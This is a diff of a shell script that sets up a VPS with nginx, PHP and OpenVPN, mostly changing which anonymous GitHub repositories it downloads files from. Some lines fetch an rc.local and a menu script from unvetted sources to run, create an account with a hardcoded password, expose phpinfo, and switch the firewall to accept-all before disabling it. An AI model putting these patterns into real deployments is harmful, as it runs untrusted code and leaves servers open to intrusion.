@@ -86,40 +86,58 @@ sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf# openvpn
 
 # nginx
-apt-get -y install nginx
-apt-get -y install php7.0-fpm
-apt-get -y install php7.0-cli
+apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/KeningauVPS/sslmode/master/www.conf"
+wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/www.conf"
 mkdir -p /home/vps/public_html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /home/vps/public_html/index.html https://raw.githubusercontent.com/padubang/secret/main/index.html
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ara-rangers/vps/master/vps.conf"
+wget -O /home/vps/public_html/index.html https://raw.githubusercontent.com/GakodArmy/teli/main/index.html
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
+service nginx restart
 service php7.0-fpm restart
 
 #  openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O openvpn.tar "https://gakod.com/all/gaakod/openvpn.tar"
+wget -O openvpn.tar "https://raw.githubusercontent.com/89870must73/FILEORI/main/openvpn.tar"
 tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
 chmod +x /etc/rc.local
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/client.ovpn"
-wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/udp.ovpn"
-wget -O /home/vps/public_html/ovpnssl.ovpn "https://raw.githubusercontent.com/bengali89/Haruhara/main/joie8383/ovpnssl.ovpn"
+wget -O /home/vps/public_html/tcp.ovpn "https://raw.githubusercontent.com/89870must73/FILEORI/main/client.ovpn"
+wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/89870must73/FILEORI/main/client1.ovpn"
+wget -O /home/vps/public_html/ssl.ovpn "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/ssl.ovpn"
 wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/tcp.ovpn
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/ssl.ovpn
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
 useradd -m -g users -s /bin/bash archangels
 echo "7C22C4ED" | chpasswd
 echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
 cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+
+# Setting UFW
+apt-get install ufw
+ufw allow ssh
+ufw allow 443/tcp
+sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
+sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
+cat > /etc/ufw/before.rules <<-END
+# START OPENVPN RULES
+# NAT table rules
+*nat
+:POSTROUTING ACCEPT [0:0]
+# Allow traffic from OpenVPN client to eth0
+-A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE
+COMMIT
+# END OPENVPN RULES
+END
+ufw status
+ufw disable
 
 # download script
 wget -O /usr/local/bin/menu "https://raw.githubusercontent.com/ara-rangers/vps/master/menu"
